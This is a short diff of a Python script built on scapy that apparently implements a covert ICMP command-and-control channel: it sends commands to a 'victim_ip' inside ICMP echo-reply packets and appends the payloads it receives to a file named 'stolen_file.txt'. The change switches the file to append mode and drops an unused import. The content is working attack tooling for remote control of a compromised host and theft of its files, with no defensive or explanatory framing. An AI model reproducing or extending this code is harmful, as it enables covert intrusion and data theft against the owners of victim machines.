@@ -1,9 +1,7 @@
 from scapy.all import *
 import os
 import time
-import uuid
-
-
+ 
 ICMP_ID = int(13331)
 TTL = int(64)
 ICMP_ID_HELO = int(23144)
@@ -38,8 +36,7 @@ def SendCmd(command):
                         send(IP(dst=victim_ip)/ICMP(type=0, id=ICMP_ID, seq=curr_seq) / command)
                         pass
                     elif payload != "end":
-                        f = open("stolen_file", "wb")
-                        #f = open("stolen_file.txt", "a")
+                        f = open("stolen_file.txt", "a")
                         f.write(payload)
                         f.close()
                         curr_seq = pkt[0][ICMP].seq
